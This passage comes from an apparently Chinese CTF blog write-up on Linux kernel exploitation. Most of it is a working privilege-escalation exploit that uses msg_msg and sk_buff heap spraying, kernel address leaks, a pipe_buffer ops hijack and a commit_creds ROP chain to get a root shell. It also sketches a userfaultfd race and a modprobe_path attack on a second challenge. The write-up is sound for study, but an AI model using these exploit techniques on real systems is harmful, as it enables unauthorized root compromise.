class="comment">     * construct fake msg_msg to leak addr of UAF obj</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.III spray sk_buff to leak kheap addr\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray sk_buff to construct fake msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray sk_buff...&quot;</span>);</span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, </span><br><span class="line">            VICTIM_MSG_TYPE, <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// use fake msg_msg to read OOB</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] OOB read from victim msg_msg&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">int</span> *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nearby_msg = (<span class="keyword">struct</span> msg_msg*) </span><br><span class="line">            &amp;oob_msg.mtext[(SECONDARY_MSG_SIZE) - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of primary msg of msg nearby victim: \033[0m%llx\n&quot;</span>, </span><br><span class="line">            nearby_msg-&gt;m_list.prev);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// release and re-spray sk_buff to construct fake msg_msg</span></span><br><span class="line">    <span class="comment">// so that we can make an arbitrary read on a primary msg_msg</span></span><br><span class="line">    <span class="keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, </span><br><span class="line">            VICTIM_MSG_TYPE, <span class="keyword">sizeof</span>(oob_msg.mtext), </span><br><span class="line">            nearby_msg-&gt;m_list.prev - <span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] arbitrary read on primary msg of msg nearby victim&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">int</span> *)&amp;oob_msg.mtext[<span class="number">0x1000</span>] != MSG_TAG)</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// cal the addr of UAF obj by the header we just read out</span></span><br><span class="line">    nearby_msg_prim = (<span class="keyword">struct</span> msg_msg*) </span><br><span class="line">            &amp;oob_msg.mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">    victim_addr = nearby_msg_prim-&gt;m_list.next - <span class="number">0x400</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg next to victim: \033[0m%llx\n&quot;</span>, </span><br><span class="line">            nearby_msg_prim-&gt;m_list.next);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg UAF object: \033[0m%llx\n&quot;</span>, victim_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.IV</span></span><br><span class="line"><span class="comment">     * fix the header of UAF obj and release it</span></span><br><span class="line"><span class="comment">     * spray pipe_buffer and leak the kernel base</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.IV spray pipe_buffer to leak kernel base\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// re-construct the msg_msg to fix it</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] fixing the UAF obj as a msg_msg...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(fake_secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(fake_secondary_msg));</span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            victim_addr + <span class="number">0x800</span>, victim_addr + <span class="number">0x800</span>, <span class="comment">// a valid kheap addr is valid</span></span><br><span class="line">            VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg), </span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// release UAF obj as secondary msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] release UAF obj in message queue...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (readMsg(msqid[victim_qid], &amp;secondary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(secondary_msg), VICTIM_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to receive secondary msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray pipe_buffer</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create pipe!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// write something to activate it</span></span><br><span class="line">        <span class="keyword">if</span> (write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to write the pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// release the sk_buff to read pipe_buffer, leak kernel base</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] release sk_buff to read pipe_buffer...&quot;</span>);</span><br><span class="line">    pipe_buf_ptr = (<span class="keyword">struct</span> pipe_buffer *) &amp;fake_secondary_msg;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], &amp;fake_secondary_msg, </span><br><span class="line">                    <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="number">0xffffffff81000000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] got anon_pipe_buf_ops: \033[0m%llx\n&quot;</span>, </span><br><span class="line">                        pipe_buf_ptr-&gt;ops);</span><br><span class="line">                kernel_offset = pipe_buf_ptr-&gt;ops - ANON_PIPE_BUF_OPS;</span><br><span class="line">                kernel_base = <span class="number">0xffffffff81000000</span> + kernel_offset;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%llx \033[32m\033[1moffset: \033[0m%llx\n&quot;</span>, </span><br><span class="line">            kernel_base, kernel_offset);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.V</span></span><br><span class="line"><span class="comment">     * hijack the ops of pipe_buffer</span></span><br><span class="line"><span class="comment">     * free all pipe to trigger fake ptr</span></span><br><span class="line"><span class="comment">     * so that we hijack the RIP</span></span><br><span class="line"><span class="comment">     * construct a ROP on pipe_buffer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.V hijack the ops of pipe_buffer, gain root privilege\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] pre-construct data in userspace...&quot;</span>);</span><br><span class="line">    pipe_buf_ptr = (<span class="keyword">struct</span> pipe_buffer *) fake_secondary_msg;</span><br><span class="line">    pipe_buf_ptr-&gt;page = *(<span class="type">uint64_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    pipe_buf_ptr-&gt;ops = victim_addr + <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line">    ops_ptr = (<span class="keyword">struct</span> pipe_buf_operations *) &amp;fake_secondary_msg[<span class="number">0x100</span>];</span><br><span class="line">    ops_ptr-&gt;release = PUSH_RSI_POP_RSP_POP_4VAL_RET + kernel_offset;</span><br><span class="line"></span><br><span class="line">    rop_idx = <span class="number">0</span>;</span><br><span class="line">    rop_chain = (<span class="type">uint64_t</span>*) &amp;fake_secondary_msg[<span class="number">0x20</span>];</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + INIT_CRED;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">22</span>;</span><br><span class="line">    rop_chain[rop_idx++] = *(<span class="type">uint64_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop_chain[rop_idx++] = *(<span class="type">uint64_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop_chain[rop_idx++] = getRootShell;</span><br><span class="line">    rop_chain[rop_idx++] = user_cs;</span><br><span class="line">    rop_chain[rop_idx++] = user_rflags;</span><br><span class="line">    rop_chain[rop_idx++] = user_sp;</span><br><span class="line">    rop_chain[rop_idx++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray sk_buff to hijack pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// for gdb attach only</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] gadget: %p\n&quot;</span>, kernel_offset + PUSH_RSI_POP_RSP_POP_4VAL_RET);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] free_pipe_info: %p\n&quot;</span>, kernel_offset + FREE_PIPE_INFO);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger fake ops-&gt;release to hijack RIP...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        close(pipe_fd[i][<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd[i][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一开始有点困惑,为什么每个消息队列上还要安排一个96大小msg,之后却又没用上</p><p>其实这个是有大用的,在我们成功泄露完victime的下一个obj的prev后</p><p>我们需要通过修改msg_msg-&gt;next为这个prev来读取victime的下一个obj的地址</p><p>但是如果直接修改为prev就会出现一个问题,其next指针不为null,会继续向下解引用</p><p>虽然不至于发生kernel panic却会使得程序进入无限循环</p><p>因此此时改为prev-8就可以解决这个问题,由于96这个msg的存在,prev-8的位置很大概率就是0</p><p>但如果我们没有这个96msg的话,prev就会使msg_queue,这个我们是无法保证prev-8是0的</p><h2 id="ciscn2022华东南-catus"><a href="#ciscn2022华东南-catus" class="headerlink" title="ciscn2022华东南-catus"></a>ciscn2022华东南-catus</h2><p>保护还是那些常规保护</p><p>利用的点在于ioctl提供的功能(add,edit,delete)都没有加锁,再加上本题的内核版本是5.10,还能使用userfaultfd</p><p>所以用户自己可以构造一个uaf</p><p>本题依然是以msgmsg结构体为利用核心</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">kernel_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// r12</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// r12</span></span><br><span class="line">  __int64 v7; <span class="comment">// rax</span></span><br><span class="line">  __int64 v8; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">  __int64 v10; <span class="comment">// r13</span></span><br><span class="line">  __int64 v11; <span class="comment">// r12</span></span><br><span class="line">  __int64 v12; <span class="comment">// r14</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v13; <span class="comment">// [rsp-40h] [rbp-40h] BYREF</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp-38h] [rbp-38h]</span></span><br><span class="line">  __int64 v15; <span class="comment">// [rsp-30h] [rbp-30h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v16; <span class="comment">// [rsp-28h] [rbp-28h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  v16 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  result = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">48</span> )                               <span class="comment">// free</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !copy_from_user(&amp;v13, v2, <span class="number">8LL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( delFlags &lt;= <span class="number">1</span> &amp;&amp; v13 &lt;= <span class="number">0x20</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = v13;</span><br><span class="line">        <span class="keyword">if</span> ( addrList[v13] )</span><br><span class="line">        &#123;</span><br><span class="line">          kfree();</span><br><span class="line">          ++delFlags;</span><br><span class="line">          addrList[v4] = <span class="number">0LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">80</span> )                               <span class="comment">// edit</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !copy_from_user(&amp;v13, v2, <span class="number">24LL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( editFlags &lt;= <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v9 = v14;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)v14 &gt; <span class="number">0x400</span> )</span><br><span class="line">          v9 = <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v13 &lt;= <span class="number">0x20</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v10 = addrList[v13];</span><br><span class="line">          <span class="keyword">if</span> ( v10 )</span><br><span class="line">          &#123;</span><br><span class="line">            v11 = v9;</span><br><span class="line">            v12 = v15;</span><br><span class="line">            _check_object_size(v10, v9, <span class="number">0LL</span>);</span><br><span class="line">            <span class="keyword">if</span> ( !copy_from_user(v10, v12, v11) )</span><br><span class="line">            &#123;</span><br><span class="line">              ++editFlags;</span><br><span class="line">              <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( a2 != <span class="number">32</span> )                               <span class="comment">// alloc</span></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  <span class="keyword">if</span> ( copy_from_user(&amp;v13, v2, <span class="number">16LL</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( addFlags &gt; <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v5 = kmem_cache_alloc_trace(kmalloc_caches[<span class="number">10</span>], <span class="number">3264LL</span>, <span class="number">1024LL</span>);</span><br><span class="line">  v6 = v5;</span><br><span class="line">  <span class="keyword">if</span> ( !v5 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v7 = copy_from_user(v5, v14, <span class="number">1024LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v7 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = (<span class="type">int</span>)v7;</span><br><span class="line">    <span class="keyword">if</span> ( !addrList[v7] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( ++v7 == <span class="number">32</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  ++addFlags;</span><br><span class="line">  result = <span class="number">0LL</span>;</span><br><span class="line">  addrList[v8] = v6;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>这题调试了一下应该是没有开启random_list和Hardened freelist的,并且CONFIG_MEMCG_KMEM=n</p><p>每个皆只能使用两次</p><ol><li>注册两个userfaultfd,分别用于两次条件竞争,开启两个线程与userfaultfd配合</li><li>第一次add一个obj0,然后edit触发条件竞争,释放掉obj0又将其申请为msg_msg结构体(除这个外还需要再申请一个相同的),然后userfaultfd默认缺页处理操作填充内容时覆盖msg_msg的header字段</li><li>再申请pipe,其pipe_buffer刚好又位于msg_msg的后方,此时读取msg_msg便能够泄露pipe_buffer的内容,也就能够泄露kernel代码段基址,然后又能够通过之前申请的另一个msg_msg的prev字段获得内核堆地址</li><li>第二次add一个obj1,再次edit触发条件竞争,又将obj1释放,然后缺页处理函数填充内容时刚好覆盖掉obj的next指针为modprobe_path的地址</li><li>然后构造好modprobe_path,这里因为会将obj置零,所以有些关键数据需要手动恢复(特别是kmod相关的)</li><li>然后再两次申请msg_msg即可劫持</li><li>触发modprobe</li></ol><p><strong>exp:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span 